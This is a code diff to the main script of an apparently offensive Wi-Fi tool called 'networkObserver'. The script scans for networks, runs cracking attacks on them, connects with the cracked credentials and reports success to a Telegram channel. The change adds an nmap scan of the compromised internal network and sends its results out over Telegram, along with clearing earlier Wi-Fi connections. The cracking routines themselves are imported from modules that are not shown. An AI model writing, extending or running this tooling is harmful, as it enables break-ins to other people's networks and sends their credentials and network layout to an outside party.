@@ -1,43 +1,36 @@
 import os
 import time
 import logging
-import subprocess
-from utils import clean_files, setup_logging, is_ssh_connected
+from utils import clean_files, setup_logging, is_ssh_connected, has_internet
 from constants import (
     TARGETS_FILE,
     CRACKED_FILE,
     ATTACK_INTERFACE,
     PCAP_FILE,
     STOP_ON_SUCCESS,
-    MAX_RUNTIME
+    MAX_RUNTIME,
+    ENABLE_NMAP_SCAN
 )
 from wifi_scan import scan_targets
 from wifi_attack import attack_target
-from wifi_connect import connect_to_wifi
+from wifi_connect import connect_to_wifi, delete_all_wifi_connections
 from send_to_telegram import send_message
+from nmap_scan import run_nmap_scan, get_wifi_ip, clean_nmap_output
 
 global_start_time = time.time()
 
-def has_internet():
-    try:
-        subprocess.check_call(
-            ["ping", "-c", "1", "-W", "2", "8.8.8.8"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        return True
-    except subprocess.CalledProcessError:
-        return False
-
-
 # Ensure logs directory exists + configure logging
 setup_logging()
-
 logging.info("Starting networkObserver")
+
+# Clean up any lingering Wi-Fi connections before scan
+delete_all_wifi_connections()
+logging.info("Disconnected all previous Wi-Fi connections.")
 
 # Clean temp files
 clean_files(TARGETS_FILE, CRACKED_FILE, PCAP_FILE)
 logging.info("Temporary files cleaned.")
+
 
 # Scan for targets
 targets = scan_targets(ATTACK_INTERFACE)
@@ -62,6 +55,16 @@ while targets:
             if has_internet():
                 logging.info("Connection successful. Sending to Telegram...")
                 send_message(msg)
+                if ENABLE_NMAP_SCAN:
+                    ip = get_wifi_ip(ATTACK_INTERFACE)
+                    if ip:
+                        logging.info(f"Running nmap scan on internal network: {ip}")
+                        nmap_result = run_nmap_scan(ip)
+                        if nmap_result:
+                            cleaned_output = clean_nmap_output(nmap_result)
+                            send_message(f"[nmap scan result]\n```{cleaned_output[:4000]}```")
+                    else:
+                        logging.warning("No IP assigned to wlan0. Skipping nmap scan.")
             else:
                 logging.warning("Connected, but no internet. Skipping Telegram message.")
             if STOP_ON_SUCCESS:
